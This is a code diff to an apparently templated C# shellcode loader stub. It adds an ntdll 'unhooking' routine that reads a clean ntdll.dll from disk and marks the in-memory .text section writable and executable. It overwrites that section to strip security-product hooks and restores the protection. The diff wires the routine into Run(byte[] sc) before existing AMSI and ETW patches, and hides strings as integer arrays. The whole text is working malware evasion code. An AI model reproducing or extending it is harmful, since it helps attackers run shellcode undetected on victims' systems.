@@ -109,7 +109,57 @@ namespace {{ wsf_stub_namespace }} {
             } catch {}
         }
 
+        static void {{ v.fn_unhook }}() {
+            try {
+                IntPtr ntdllMem = IntPtr.Zero;
+                foreach (System.Diagnostics.ProcessModule m in
+                         System.Diagnostics.Process.GetCurrentProcess().Modules)
+                    if (m.ModuleName.ToLower() == B(new int[]{ {{ v.jsc_ntdll_dll }} })) {
+                        ntdllMem = m.BaseAddress; break;
+                    }
+                if (ntdllMem == IntPtr.Zero) return;
+                // Read clean ntdll from disk
+                string path = B(new int[]{67,58,92,87,105,110,100,111,119,115,92,83,121,115,116,101,109,51,50,92,110,116,100,108,108,46,100,108,108});
+                byte[] clean = System.IO.File.ReadAllBytes(path);
+                // Parse PE: find .text section
+                int peo = Marshal.ReadInt32(ntdllMem, 0x3C);
+                int nsec = Marshal.ReadInt16(IntPtr.Add(ntdllMem, peo + 0x06));
+                int sechdr = peo + 0x108;  // PE64 optional header size
+                IntPtr textVa = IntPtr.Zero; int textSize = 0; int textRaw = 0;
+                for (int i = 0; i < nsec; i++) {
+                    int off = sechdr + i * 0x28;
+                    byte n0 = Marshal.ReadByte(ntdllMem, off);
+                    byte n1 = Marshal.ReadByte(ntdllMem, off + 1);
+                    byte n2 = Marshal.ReadByte(ntdllMem, off + 2);
+                    byte n3 = Marshal.ReadByte(ntdllMem, off + 3);
+                    byte n4 = Marshal.ReadByte(ntdllMem, off + 4);
+                    // ".text" = 0x2E 0x74 0x65 0x78 0x74
+                    if (n0 == 0x2E && n1 == 0x74 && n2 == 0x65 && n3 == 0x78 && n4 == 0x74) {
+                        textSize = Marshal.ReadInt32(ntdllMem, off + 0x08);
+                        int textRva = Marshal.ReadInt32(ntdllMem, off + 0x0C);
+                        textRaw    = Marshal.ReadInt32(ntdllMem, off + 0x14);
+                        textVa = IntPtr.Add(ntdllMem, textRva);
+                        break;
+                    }
+                }
+                if (textVa == IntPtr.Zero) return;
+                // VirtualProtect .text RWX
+                IntPtr ntp = {{ v.fn_getexport }}(ntdllMem, N(new int[]{ {{ v.jsc_nt_prot_vm }} }));
+                if (ntp == IntPtr.Zero) return;
+                var prot = ({{ v.del_nt_prot }})Marshal.GetDelegateForFunctionPointer(ntp, typeof({{ v.del_nt_prot }}));
+                IntPtr ph = (IntPtr)(-1);
+                IntPtr ba = textVa; UIntPtr sz = (UIntPtr)textSize; uint old;
+                prot(ph, ref ba, ref sz, 0x40, out old);
+                // Copy clean .text bytes
+                Marshal.Copy(clean, textRaw, textVa, textSize);
+                // Restore protection
+                IntPtr ba2 = textVa; UIntPtr sz2 = (UIntPtr)textSize;
+                prot(ph, ref ba2, ref sz2, old, out old);
+            } catch {}
+        }
+
         public static void Run(byte[] sc) {
+            {{ v.fn_unhook }}();
             {{ v.fn_amsi_patch }}();
             {{ v.fn_etw_patch }}();
             IntPtr ntdll = IntPtr.Zero;
